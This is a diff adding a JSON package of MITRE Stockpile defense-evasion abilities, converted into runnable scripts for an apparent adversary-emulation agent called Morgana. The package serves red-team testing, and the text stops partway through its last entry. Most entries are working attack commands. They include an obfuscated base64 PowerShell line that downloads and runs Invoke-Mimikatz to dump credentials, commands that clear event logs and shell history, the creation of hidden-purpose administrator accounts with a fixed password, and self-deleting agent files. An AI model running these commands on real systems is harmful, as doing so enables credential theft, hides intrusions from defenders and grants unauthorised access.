@@ -1,0 +1,1130 @@
+{
+  "package_id": "stockpile-evasion-v1",
+  "package_name": "STOCKPILE - Defense Evasion Pack (MITRE)",
+  "version": "1.0.0",
+  "description": "MITRE CALDERA Stockpile command-based abilities converted to Morgana-native scripts for Defense Evasion (TA0005). CALDERA is not required at runtime.",
+  "author": "MITRE (converted by X3M.AI for Morgana)",
+  "created": "2026-04-30",
+  "source": "mitre-stockpile",
+  "source_repository": "https://github.com/mitre/stockpile",
+  "source_commit": "996ec41cd1c5d1c7cc09e620fc55dabe5aefd9cc",
+  "mitre_domain": "enterprise-attack",
+  "mitre_tactic": "Defense Evasion (TA0005)",
+  "mitre_tactic_name": "Defense Evasion",
+  "mitre_tactic_source": "defense-evasion",
+  "mitre_tcodes": [
+    "T1006",
+    "T1027.010",
+    "T1036",
+    "T1036.003",
+    "T1036.005",
+    "T1070.001",
+    "T1070.003",
+    "T1070.004",
+    "T1078.003",
+    "T1112",
+    "T1202",
+    "T1222.001",
+    "T1222.002",
+    "T1484.001",
+    "T1497.001",
+    "T1497.003",
+    "T1562.001",
+    "T1622"
+  ],
+  "platform": [
+    "linux",
+    "macos",
+    "windows"
+  ],
+  "prerequisites": [
+    "Morgana agent installed on the authorized target",
+    "Required Stockpile facts supplied as Morgana tag values",
+    "CALDERA and Stockpile are not required at runtime"
+  ],
+  "license": "Apache-2.0",
+  "tag_categories": [
+    {
+      "category_id": "stockpile_evasion_1070_004",
+      "label": "T1070.004 Stockpile Parameters",
+      "description": "Input parameters for MITRE Stockpile T1070.004 abilities.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "T1070.004"
+      ],
+      "tags": [
+        {
+          "key": "stockpile_evasion_1070_004_exe_name",
+          "label": "Exe Name",
+          "description": "MITRE Stockpile fact: exe_name",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": true
+        },
+        {
+          "key": "stockpile_evasion_1070_004_location",
+          "label": "Location",
+          "description": "MITRE Stockpile fact: location",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": true
+        }
+      ]
+    },
+    {
+      "category_id": "stockpile_evasion_1222_002",
+      "label": "T1222.002 Stockpile Parameters",
+      "description": "Input parameters for MITRE Stockpile T1222.002 abilities.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "T1222.002"
+      ],
+      "tags": [
+        {
+          "key": "stockpile_evasion_1222_002_host_dir_staged",
+          "label": "Host Dir Staged",
+          "description": "MITRE Stockpile fact: host.dir.staged",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": true
+        }
+      ]
+    }
+  ],
+  "scripts": [
+    {
+      "id": "STOCKPILE - T1006 - Read Volume Boot Sector Via DOS Device Path (Generated From Atomic Red Team) [Windows/PowerShell]",
+      "name": "STOCKPILE - T1006 - Read Volume Boot Sector Via DOS Device Path (Generated From Atomic Red Team) [Windows/PowerShell]",
+      "description": "Ability for Direct Volume Access (ATT&CK T1006). \nUses PowerShell to open a handle on the drive volume via the `\\\\.\\` DOS device path\nspecifier and perform direct access read of the first few bytes of the volume.\nRef: (https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths)\nGenerated from Atomic Red Team procedures (88f6327e-51ec-4bbf-b2e8-3fea534eab8b); review and test safely before use.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1006",
+      "technique_name": "Direct Volume Access",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "$buffer = New-Object byte[] 11;\n$handle = New-Object IO.FileStream \"\\\\.\\C:\", 'Open', 'Read', 'ReadWrite';\n$handle.Read($buffer, 0, $buffer.Length);\n$handle.Close();\nFormat-Hex -InputObject $buffer;",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "bb02567a-6f41-4072-afbb-dd1bfd45238e",
+      "source_path": "data/abilities/defense-evasion/bb02567a-6f41-4072-afbb-dd1bfd45238e.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1027.010 - Obfuscated PowerShell Invoke MimiKatz [Windows/PowerShell]",
+      "name": "STOCKPILE - T1027.010 - Obfuscated PowerShell Invoke MimiKatz [Windows/PowerShell]",
+      "description": "Run base64-encoded PowerShell command to download and execute Invoke-Mimikatz.ps1 from PowerShell Empire",
+      "tactic": "Defense Evasion",
+      "tcode": "T1027.010",
+      "technique_name": "Obfuscated Files or Information: Command Obfuscation",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "ccdb8caf-c69e-424b-b930-551969450c57",
+      "source_path": "data/abilities/defense-evasion/ccdb8caf-c69e-424b-b930-551969450c57.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1036 - Masquerading - System File Copied to Unusual Location (Generated from Atomic... [Windows/PowerShell]",
+      "name": "STOCKPILE - T1036 - Masquerading - System File Copied to Unusual Location (Generated from Atomic... [Windows/PowerShell]",
+      "description": "Ability for Masquerading (ATT&CK T1036).\nCopies system files to a non-system directory and executes it from there.\nGenerated from Atomic Red Team procedures (51005ac7-52e2-45e0-bdab-d17c6d4916cd); review and test safely before use.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1036",
+      "technique_name": "Masquerading",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "copy-item \"$env:windir\\System32\\cmd.exe\" -destination \"$env:allusersprofile\\cmd.exe\";\nstart-process \"$env:allusersprofile\\cmd.exe\";\nsleep -s 5;\nstop-process -name \"cmd\" | out-null;",
+      "cleanup_command": "remove-item \"$env:allusersprofile\\cmd.exe\" -force -erroraction silentlycontinue",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "36fd74b1-50e7-4646-929e-1cc384ff2e36",
+      "source_path": "data/abilities/defense-evasion/36fd74b1-50e7-4646-929e-1cc384ff2e36.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1036.003 - Move Powershell & triage [Windows/PowerShell]",
+      "name": "STOCKPILE - T1036.003 - Move Powershell & triage [Windows/PowerShell]",
+      "description": "Copy powershell to non-standard location and perform triage commands",
+      "tactic": "Defense Evasion",
+      "tcode": "T1036.003",
+      "technique_name": "Masquerading: Rename Legitimate Utilities",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Copy-Item C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\debug.exe;\nC:\\Windows\\Temp\\debug.exe get-process >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localgroup >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localuser >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion >> C:\\Windows\\temp\\debug.log;",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "e5f9de8f-3df1-4e78-ad92-a784e3f6770d",
+      "source_path": "data/abilities/defense-evasion/e5f9de8f-3df1-4e78-ad92-a784e3f6770d.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1036.005 - Execute Process From Directory Masquerading As Current Parent Dir (Generated... [Linux/Bash]",
+      "name": "STOCKPILE - T1036.005 - Execute Process From Directory Masquerading As Current Parent Dir (Generated... [Linux/Bash]",
+      "description": "Ability for Masquerading: Match Legitimate Resource Name or Location (ATT&CK T1036.005).\nCreates and executes a process from a directory masquerading as the current parent directory (`...` instead of the normal `..`)\nGenerated from Atomic Red Team procedures (812c3ab8-94b0-4698-a9bf-9420af23ce24); review and test safely before use.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1036.005",
+      "technique_name": "Masquerading: Match Legitimate Resource Name or Location",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "command": "mkdir $HOME/...;\ncp $(which sh) $HOME/...;\n$HOME/.../sh -c \"echo test T1036.005\"",
+      "cleanup_command": "rm -rf $HOME/.../",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "a6b2bc9a-6724-49e5-a3bf-0d689a30ecb9",
+      "source_path": "data/abilities/defense-evasion/a6b2bc9a-6724-49e5-a3bf-0d689a30ecb9.yml",
+      "source_executor": "sh",
+      "source_platform": "linux"
+    },
+    {
+      "id": "STOCKPILE - T1036.005 - Execute Process From Directory Masquerading As Current Parent Dir (Generated... [macOS/Bash]",
+      "name": "STOCKPILE - T1036.005 - Execute Process From Directory Masquerading As Current Parent Dir (Generated... [macOS/Bash]",
+      "description": "Ability for Masquerading: Match Legitimate Resource Name or Location (ATT&CK T1036.005).\nCreates and executes a process from a directory masquerading as the current parent directory (`...` instead of the normal `..`)\nGenerated from Atomic Red Team procedures (812c3ab8-94b0-4698-a9bf-9420af23ce24); review and test safely before use.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1036.005",
+      "technique_name": "Masquerading: Match Legitimate Resource Name or Location",
+      "executor": "bash",
+      "platform": "macos",
+      "required_tags": [],
+      "command": "mkdir $HOME/...;\ncp $(which sh) $HOME/...;\n$HOME/.../sh -c \"echo test T1036.005\"",
+      "cleanup_command": "rm -rf $HOME/.../",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "a6b2bc9a-6724-49e5-a3bf-0d689a30ecb9",
+      "source_path": "data/abilities/defense-evasion/a6b2bc9a-6724-49e5-a3bf-0d689a30ecb9.yml",
+      "source_executor": "sh",
+      "source_platform": "darwin"
+    },
+    {
+      "id": "STOCKPILE - T1070.001 - Clear Windows Event Logs [Windows/PowerShell]",
+      "name": "STOCKPILE - T1070.001 - Clear Windows Event Logs [Windows/PowerShell]",
+      "description": "Clear Windows Event logs [intended to trigger CAR-2016-04-002]",
+      "tactic": "Defense Evasion",
+      "tcode": "T1070.001",
+      "technique_name": "Indicator Removal on Host: Clear Windows Event Logs",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Clear-Eventlog Security;\nClear-Eventlog System;",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "fcf71ee3-d1a9-4136-b919-9e5f6da43608",
+      "source_path": "data/abilities/defense-evasion/fcf71ee3-d1a9-4136-b919-9e5f6da43608.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1070.003 - Avoid logs [Linux/Bash]",
+      "name": "STOCKPILE - T1070.003 - Avoid logs [Linux/Bash]",
+      "description": "Stop terminal from logging history",
+      "tactic": "Defense Evasion",
+      "tcode": "T1070.003",
+      "technique_name": "Indicator Removal on Host: Clear Command History",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "command": "> $HOME/.bash_history && unset HISTFILE",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+      "source_path": "data/abilities/defense-evasion/43b3754c-def4-4699-a673-1d85648fda6a.yml",
+      "source_executor": "sh",
+      "source_platform": "linux"
+    },
+    {
+      "id": "STOCKPILE - T1070.003 - Avoid logs [Windows/PowerShell]",
+      "name": "STOCKPILE - T1070.003 - Avoid logs [Windows/PowerShell]",
+      "description": "Stop terminal from logging history",
+      "tactic": "Defense Evasion",
+      "tcode": "T1070.003",
+      "technique_name": "Indicator Removal on Host: Clear Command History",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Clear-History;Clear",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+      "source_path": "data/abilities/defense-evasion/43b3754c-def4-4699-a673-1d85648fda6a.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1070.003 - Avoid logs [macOS/Bash]",
+      "name": "STOCKPILE - T1070.003 - Avoid logs [macOS/Bash]",
+      "description": "Stop terminal from logging history",
+      "tactic": "Defense Evasion",
+      "tcode": "T1070.003",
+      "technique_name": "Indicator Removal on Host: Clear Command History",
+      "executor": "bash",
+      "platform": "macos",
+      "required_tags": [],
+      "command": "> $HOME/.bash_history && unset HISTFILE",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+      "source_path": "data/abilities/defense-evasion/43b3754c-def4-4699-a673-1d85648fda6a.yml",
+      "source_executor": "sh",
+      "source_platform": "darwin"
+    },
+    {
+      "id": "STOCKPILE - T1070.004 - Deadman - Delete agent file [Linux/Bash]",
+      "name": "STOCKPILE - T1070.004 - Deadman - Delete agent file [Linux/Bash]",
+      "description": "Deadman ability to delete agent file after termination.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1070.004",
+      "technique_name": "Indicator Removal on Host: File Deletion",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [
+        "stockpile_evasion_1070_004_exe_name"
+      ],
+      "command": "path=\"$(pwd)/#{stockpile_evasion_1070_004_exe_name}\";\nnum_processes=$(for id in $(pgrep -f #{stockpile_evasion_1070_004_exe_name}); do lsof -p $id 2> /dev/null | grep \"$path\"; done | wc -l);\nif [ \"$num_processes\" -le 1 ]; then /bin/rm -f \"$path\"; fi;",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "5f844ac9-5f24-4196-a70d-17f0bd44a934",
+      "source_path": "data/abilities/defense-evasion/5f844ac9-5f24-4196-a70d-17f0bd44a934.yml",
+      "source_executor": "sh",
+      "source_platform": "linux"
+    },
+    {
+      "id": "STOCKPILE - T1070.004 - Deadman - Delete agent file [Windows/PowerShell]",
+      "name": "STOCKPILE - T1070.004 - Deadman - Delete agent file [Windows/PowerShell]",
+      "description": "Deadman ability to delete agent file after termination.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1070.004",
+      "technique_name": "Indicator Removal on Host: File Deletion",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "stockpile_evasion_1070_004_location"
+      ],
+      "command": "$startupClass = Get-CimClass -ClassName Win32_ProcessStartup;\n$startupInfo = New-CimInstance -CimClass $startupClass -Property @{ShowWindow = 0} -ClientOnly;\n$processClass = Get-CimClass -ClassName Win32_Process;\nInvoke-CimMethod -CimClass $processClass -MethodName Create -Arguments @{\n    Commandline = 'cmd.exe /c \"timeout /nobreak /t 10 >nul 2>nul & del /f #{stockpile_evasion_1070_004_location}\"';\n    ProcessStartupInformation = [CimInstance]$startupInfo\n};",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "5f844ac9-5f24-4196-a70d-17f0bd44a934",
+      "source_path": "data/abilities/defense-evasion/5f844ac9-5f24-4196-a70d-17f0bd44a934.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1070.004 - Deadman - Delete agent file [macOS/Bash]",
+      "name": "STOCKPILE - T1070.004 - Deadman - Delete agent file [macOS/Bash]",
+      "description": "Deadman ability to delete agent file after termination.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1070.004",
+      "technique_name": "Indicator Removal on Host: File Deletion",
+      "executor": "bash",
+      "platform": "macos",
+      "required_tags": [
+        "stockpile_evasion_1070_004_exe_name"
+      ],
+      "command": "path=\"$(pwd)/#{stockpile_evasion_1070_004_exe_name}\";\nnum_processes=$(for id in $(pgrep -f #{stockpile_evasion_1070_004_exe_name}); do lsof -p $id 2> /dev/null | grep \"$path\"; done | wc -l);\nif [ \"$num_processes\" -le 1 ]; then /bin/rm -f \"$path\"; fi;",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "5f844ac9-5f24-4196-a70d-17f0bd44a934",
+      "source_path": "data/abilities/defense-evasion/5f844ac9-5f24-4196-a70d-17f0bd44a934.yml",
+      "source_executor": "sh",
+      "source_platform": "darwin"
+    },
+    {
+      "id": "STOCKPILE - T1078.003 - Create local account with admin privileges (Generated from Atomic Red Team) [Linux/Bash]",
+      "name": "STOCKPILE - T1078.003 - Create local account with admin privileges (Generated from Atomic Red Team) [Linux/Bash]",
+      "description": "Ability for Valid Accounts: Local Accounts (ATT&CK T1078.003).\nCreates a new local account with elevated privileges.\nGenerated from Atomic Red Team procedures (a524ce99-86de-4db6-b4f9-e08f35a47a15, \nf1275566-1c26-4b66-83e3-7f9f7f964daa, 02a91c34-8a5b-4bed-87af-501103eb5357);\nreview and test safely before use.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1078.003",
+      "technique_name": "Valid Accounts: Local Accounts",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "command": "password=$(openssl passwd -1 \"4RTisCool!321\");\n([ \"$(uname)\" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password arttest) || (pw useradd arttest -g wheel -s /bin/sh && (echo $password | pw mod user arttest -h 0));\nsu arttest -c \"whoami; exit\"",
+      "cleanup_command": "[ \"$(uname)\" = 'Linux' ] && userdel arttest -rf || rmuser -y arttest",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "5d0e5dbb-21a4-4dcf-9dcd-90d9650e4705",
+      "source_path": "data/abilities/defense-evasion/5d0e5dbb-21a4-4dcf-9dcd-90d9650e4705.yml",
+      "source_executor": "sh",
+      "source_platform": "linux"
+    },
+    {
+      "id": "STOCKPILE - T1078.003 - Create local account with admin privileges (Generated from Atomic Red Team) [Windows/CMD]",
+      "name": "STOCKPILE - T1078.003 - Create local account with admin privileges (Generated from Atomic Red Team) [Windows/CMD]",
+      "description": "Ability for Valid Accounts: Local Accounts (ATT&CK T1078.003).\nCreates a new local account with elevated privileges.\nGenerated from Atomic Red Team procedures (a524ce99-86de-4db6-b4f9-e08f35a47a15, \nf1275566-1c26-4b66-83e3-7f9f7f964daa, 02a91c34-8a5b-4bed-87af-501103eb5357);\nreview and test safely before use.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1078.003",
+      "technique_name": "Valid Accounts: Local Accounts",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "net user arttest /add &&\nnet user arttest 4RTisCool!321 &&\nnet localgroup administrators arttest /add",
+      "cleanup_command": "net localgroup administrators arttest /delete &\nnet user arttest /delete",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "5d0e5dbb-21a4-4dcf-9dcd-90d9650e4705",
+      "source_path": "data/abilities/defense-evasion/5d0e5dbb-21a4-4dcf-9dcd-90d9650e4705.yml",
+      "source_executor": "cmd",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1078.003 - Create local account with admin privileges (Generated from Atomic Red Team) [macOS/Bash]",
+      "name": "STOCKPILE - T1078.003 - Create local account with admin privileges (Generated from Atomic Red Team) [macOS/Bash]",
+      "description": "Ability for Valid Accounts: Local Accounts (ATT&CK T1078.003).\nCreates a new local account with elevated privileges.\nGenerated from Atomic Red Team procedures (a524ce99-86de-4db6-b4f9-e08f35a47a15, \nf1275566-1c26-4b66-83e3-7f9f7f964daa, 02a91c34-8a5b-4bed-87af-501103eb5357);\nreview and test safely before use.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1078.003",
+      "technique_name": "Valid Accounts: Local Accounts",
+      "executor": "bash",
+      "platform": "macos",
+      "required_tags": [],
+      "command": "dscl . -create /Users/arttest;\ndscl . -create /Users/arttest UserShell /bin/bash;\ndscl . -create /Users/arttest RealName \"Art Test\";\ndscl . -create /Users/arttest UniqueID 503;\ndscl . -create /Users/arttest PrimaryGroupID 503;\ndscl . -create /Users/arttest NFSHomeDirectory /Local/Users/arttest;\ndscl . -passwd /Users/arttest 4RTisCool!321;\ndscl . -append /Groups/admin GroupMembership arttest;",
+      "cleanup_command": "sudo dscl . -delete /Users/arttest",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "5d0e5dbb-21a4-4dcf-9dcd-90d9650e4705",
+      "source_path": "data/abilities/defense-evasion/5d0e5dbb-21a4-4dcf-9dcd-90d9650e4705.yml",
+      "source_executor": "sh",
+      "source_platform": "darwin"
+    },
+    {
+      "id": "STOCKPILE - T1112 - Modify Registry of Current User Profile (Generated from Atomic Red Team) [Windows/PowerShell]",
+      "name": "STOCKPILE - T1112 - Modify Registry of Current User Profile (Generated from Atomic Red Team) [Windows/PowerShell]",
+      "description": "Ability for Modify Registry (ATT&CK T1112).\nModifies the registry of the currently logged in user using reg.exe. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the new entry in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced.\nGenerated from Atomic Red Team procedures (1324796b-d0f6-455a-b4ae-21ffee6aa6b9); review and test safely before use.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1112",
+      "technique_name": "Modify Registry",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f",
+      "cleanup_command": "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v HideFileExt /f",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "6cfbcde1-608f-4fe8-8a71-c52f0b367651",
+      "source_path": "data/abilities/defense-evasion/6cfbcde1-608f-4fe8-8a71-c52f0b367651.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1202 - Indirect Command Execution - pcalua.exe (Generated from Atomic Red Team) [Windows/PowerShell]",
+      "name": "STOCKPILE - T1202 - Indirect Command Execution - pcalua.exe (Generated from Atomic Red Team) [Windows/PowerShell]",
+      "description": "Ability for Indirect Command Execution (ATT&CK T1202).\nUses the Program Compatibility Assistant (pcalua.exe) to invoke the execution of programs and commands from a Command-Line Interface.\nReference: https://twitter.com/KyleHanslovan/status/912659279806640128. \nGenerated from Atomic Red Team procedures (cecfea7a-5f03-4cdd-8bc8-6f7c22862440); review and test safely before use.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1202",
+      "technique_name": "Indirect Command Execution",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "pcalua.exe -a calc.exe;\npcalua.exe -a C:\\Windows\\System32\\calc.exe;",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "19aeb9e6-1946-4f1f-96dd-5e1144a620a0",
+      "source_path": "data/abilities/defense-evasion/19aeb9e6-1946-4f1f-96dd-5e1144a620a0.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1222.001 - Enable Local and Remote Symbolic Links via fsutil (Generated from Atomic Red... [Windows/PowerShell]",
+      "name": "STOCKPILE - T1222.001 - Enable Local and Remote Symbolic Links via fsutil (Generated from Atomic Red... [Windows/PowerShell]",
+      "description": "Ability for File and Directory Permissions Modification: Windows File and Directory Permissions Modification (ATT&CK T1222.001).\nUses fsutil to enable both remote-to-local and remote-to-remote symbolic links.\nThis allows access to files from local shortcuts with local or remote paths.\nRef: https://symantec-enterprise-blogs.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware/\nGenerated from Atomic Red Team procedures (6c4ac96f-d4fa-44f4-83ca-56d8f4a55c02); review and test s...",
+      "tactic": "Defense Evasion",
+      "tcode": "T1222.001",
+      "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "fsutil behavior set SymlinkEvaluation R2L:1;\nfsutil behavior set SymlinkEvaluation R2R:1",
+      "cleanup_command": "fsutil behavior set SymlinkEvaluation R2L:0;\nfsutil behavior set SymlinkEvaluation R2R:0",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "ce97d9c6-4b88-475b-8dcc-7a2cbcc6482c",
+      "source_path": "data/abilities/defense-evasion/ce97d9c6-4b88-475b-8dcc-7a2cbcc6482c.yml",
+      "source_executor": "psh",
+      "source_platform": "windows"
+    },
+    {
+      "id": "STOCKPILE - T1222.002 - chmod - Change file or folder mode (numeric mode) (Generated from Atomic Red... [Linux/Bash]",
+      "name": "STOCKPILE - T1222.002 - chmod - Change file or folder mode (numeric mode) (Generated from Atomic Red... [Linux/Bash]",
+      "description": "Ability for File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification (ATT&CK T1222.002). \nChanges a file or folder's permissions using chmod and a specified numeric mode.\nGenerated from Atomic Red Team procedures (34ca1464-de9d-40c6-8c77-690adf36a135); review and test safely before use.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1222.002",
+      "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [
+        "stockpile_evasion_1222_002_host_dir_staged"
+      ],
+      "command": "chmod 755 #{stockpile_evasion_1222_002_host_dir_staged}",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK for detection guidance",
+      "sentinel_connector": "",
+      "package": "stockpile",
+      "source": "mitre-stockpile",
+      "stockpile_id": "fd120acf-7468-4a9b-8ead-165cac46ecfa",
+      "source_path": "data/abilities/defense-evasion/fd120acf-7468-4a9b-8ead-165cac46ecfa.yml",
+      "source_executor": "sh",
+      "source_platform": "linux",
+      "source_requirements": [
+        {
+          "plugins.stockpile.app.requirements.paw_provenance": [
+            {
+              "source": "host.dir.staged"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "STOCKPILE - T1222.002 - chmod - Change file or folder mode (numeric mode) (Generated from Atomic Red... [macOS/Bash]",
+      "name": "STOCKPILE - T1222.002 - chmod - Change file or folder mode (numeric mode) (Generated from Atomic Red... [macOS/Bash]",
+      "description": "Ability for File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification (ATT&CK T1222.002). \nChanges a file or folder's permissions using chmod and a specified numeric mode.\nGenerated from Atomic Red Team procedures (34ca1464-de9d-40c6-8c77-690adf36a135); review and test safely before use.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1222.002",
+      "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
+      "executor": "bash",
+      "platform": "macos",
+      "required_tags": [
+        "stockpile_evasion_1222_002_host_dir_staged"
+      ],
